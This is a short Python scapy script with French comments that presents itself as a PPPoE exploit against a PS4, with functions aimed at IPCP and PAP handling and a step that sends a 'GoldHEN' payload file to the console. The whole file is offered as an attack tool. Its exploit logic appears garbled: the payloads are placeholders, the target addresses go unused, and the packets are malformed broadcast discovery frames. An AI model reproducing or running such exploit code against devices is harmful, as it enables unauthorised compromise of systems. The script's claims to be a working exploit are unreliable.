from scapy.all import *
import socket
import struct

# Configuration du serveur PPPoE
PPPOE_DISCOVERY = 0x8863
PPPOE_SESSION = 0x8864
PPP_LCP = 0xc021
PPP_IPCP = 0x8021

def create_pppoe_packet(code, session_id, payload):
    pppoed = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=PPPOE_DISCOVERY)
    pppoed /= PPPoED(version=1, type=1, code=code, sessionid=session_id, len=len(payload))
    pppoed /= PPPoE_Tags(tags=[PPPoETag(type=1, length=len(payload), value=payload)])
    return pppoed

def create_ppp_packet(protocol, data):
    ppp = PPP(proto=protocol)
    ppp /= Raw(load=data)
    return ppp

def exploit_sppp_ipcp_RCR(target_mac, target_ip):
    # Créer un paquet PPPoE avec une charge utile malveillante
    payload = b'\x01' + b'\xff' * 255  # Exemple de charge utile malveillante
    pppoed_packet = create_pppoe_packet(0x09, 0x0001, payload)
    ppp_packet = create_ppp_packet(PPP_IPCP, payload)

    # Envoyer le paquet PPPoE
    sendp(pppoed_packet / ppp_packet, iface="eth0")

def exploit_sppp_pap_input(target_mac, target_ip):
    # Créer un paquet PPPoE avec une charge utile malveillante
    payload = b'\x01' + b'\xff' * 255  # Exemple de charge utile malveillante
    pppoed_packet = create_pppoe_packet(0x09, 0x0001, payload)
    ppp_packet = create_ppp_packet(PPP_LCP, payload)

    # Envoyer le paquet PPPoE
    sendp(pppoed_packet / ppp_packet, iface="eth0")

def inject_goldhen(target_mac, target_ip):
    # Charger le payload GoldHEN
    with open("goldhen.bin", "rb") as f:
        goldhen_payload = f.read()

    # Créer un paquet PPPoE avec le payload GoldHEN
    pppoed_packet = create_pppoe_packet(0x09, 0x0001, goldhen_payload)
    ppp_packet = create_ppp_packet(PPP_LCP, goldhen_payload)

    # Envoyer le paquet PPPoE
    sendp(pppoed_packet / ppp_packet, iface="eth0")

if __name__ == "__main__":
    target_mac = "00:1A:79:FF:FF:FF"  # Remplacez par l'adresse MAC de la PS4 cible
    target_ip = "192.168.1.100"  # Remplacez par l'adresse IP de la PS4 cible

    # Exploiter les vulnérabilités
    exploit_sppp_ipcp_RCR(target_mac, target_ip)
    exploit_sppp_pap_input(target_mac, target_ip)

    # Injecter GoldHEN
    inject_goldhen(target_mac, target_ip)
